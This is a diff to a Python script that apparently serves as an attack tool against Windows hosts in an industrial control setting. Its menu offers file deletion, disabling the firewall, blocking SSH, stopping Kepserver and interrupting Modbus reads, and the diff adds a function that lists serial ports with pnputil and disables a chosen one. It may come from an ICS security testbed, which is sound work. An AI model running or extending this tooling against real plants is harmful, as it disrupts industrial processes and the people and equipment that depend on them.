@@ -4,7 +4,7 @@ from os import walk, path, remove, system, getcwd
 from time import sleep
 import threading
 from shutil import copyfile
-from subprocess import run, check_call, CalledProcessError
+from subprocess import run, check_call, CalledProcessError, PIPE
 from ctypes import windll
 from sys import executable
 
@@ -66,11 +66,26 @@ def run_modinterrup():
     except subprocess.CalledProcessError as e:
         print("Error executing the executable file:", e)
 
+#Disable COM Port
+def disable_COMPort():
+    cp = run(["C:\Windows\System32\pnputil.exe", "/enum-devices", "/class", "Ports"],stdout=PIPE ,shell=True)
+    dump = cp.stdout.split()
+    deviceID = ""
+    deviceArr = []
+    for i in range(0, len(dump)):
+        if dump[i].decode("utf-8") == "ID:":
+            deviceID = dump[i+1].decode("utf-8")
+            deviceArr.append(deviceID)
+            print(str(len(deviceArr)) + " : " + deviceID)
+    userInput = input("Choose device to disable, e.g. 1, 2, 3 \n")
+    cp = run(["C:\Windows\System32\pnputil.exe", "/disable-device", deviceArr[int(userInput)-1]],stdout=PIPE ,shell=True)
+    print(cp.stdout.decode('utf-8'))
+
 
 if __name__ == '__main__':
     check_admin()
     while True:
-        print("\nChoose 1 to delete file, 2 to copy file, 3 to disable firewall, 4 to disable ssh through firewall, 5 to disable Kepserver, 6 to interrup modbus reading, 7 to exit.")
+        print("\nChoose 1 to delete file, 2 to copy file, 3 to disable firewall, 4 to disable ssh through firewall, 5 to disable Kepserver, 6 to interrup modbus reading, 7 to disable COM Port, 8 to exit.")
         attackoption = input("Choose your option:")
         if attackoption == "1":
             delete_files(testpath)
@@ -85,6 +100,8 @@ if __name__ == '__main__':
         elif attackoption == "6":
             run_modinterrup()
         elif attackoption == "7":
+            disable_COMPort()
+        elif attackoption == "8":
             break
         else:
             print ("Invalid Option!")
